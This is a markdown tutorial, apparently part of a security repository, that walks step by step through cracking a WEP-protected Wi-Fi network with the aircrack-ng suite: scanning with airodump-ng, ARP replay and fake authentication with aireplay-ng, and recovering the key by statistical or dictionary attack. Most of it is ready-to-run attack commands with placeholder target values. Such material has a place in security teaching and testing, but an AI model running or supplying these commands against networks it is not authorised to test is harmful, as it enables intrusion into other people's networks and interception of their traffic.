# WEP Vulnerability Demonstration

First of all, make these [configurations](README.md/#aircrack-ng)

## Step 1: Network Reconnaissance

```
# Scan for WEP networks
sudo airodump-ng wlan0mon

# Focus on target network
sudo airodump-ng --bssid [TARGET_BSSID] -c [CHANNEL] -w wep_capture wlan0mon
```

## Step 2: Capture Data Packets

The key vulnerability in WEP is that it reuses IVs (Initialization Vectors). 
To crack the key, we need to capture enough packets containing weak IVs.

### First and Recommended Option: ARP replay attack
```
sudo aireplay-ng -3 -b [TARGET_BSSID] -h [YOUR_MAC] wlan0mon
```
- Listens for ARP packets on the network
- When it captures one ARP packet, it retransmits it thousands of times
- Each replay generates a new packet from the AP with a new IV

### Second Option: Fake Authentication
Most Access Points will ignore packets from unassociated clients. Without being associated
```
sudo aireplay-ng -1 0 -e [NETWORK_NAME] -a [TARGET_BSSID] -h [YOUR_MAC] wlan0mon
```
- Associates your attacking machine with the Access Point as a fake client
- Does NOT provide the WEP key
- Once associated, the AP will accept and respond to packets from your MAC address
- The 0 means "associate once" (reattack delay in seconds)

## Step 3: Crack the WEP Key

Once you have 20,000-40,000 IVs packets:

### Command 1: Cryptanalysis Attack
If you have enough IVs (20,000-40,000+), it will find the key regardless of what the key is
```
sudo aircrack-ng -b [TARGET_BSSID] wep_capture-01.cap
```
- Analyzes the weak IVs captured in the .cap file
- Looks for mathematical patterns that leak key bytes
- Recovers the key byte-by-byte through probability analysis

### Command 2: Dictionary Attack
Tries each word in a wordlist file as a potential key, checking if it decrypts captured packets correctly
(This is a LAST RESORT for when the statistical attack fails)
```
sudo aircrack-ng -w /path/to/wordlist.txt wep_capture-01.cap
```
- Takes a password guess from the wordlist
- Generates the WEP key from that password
- Tests if it correctly decrypts captured data
- Requires the key to be in your wordlist
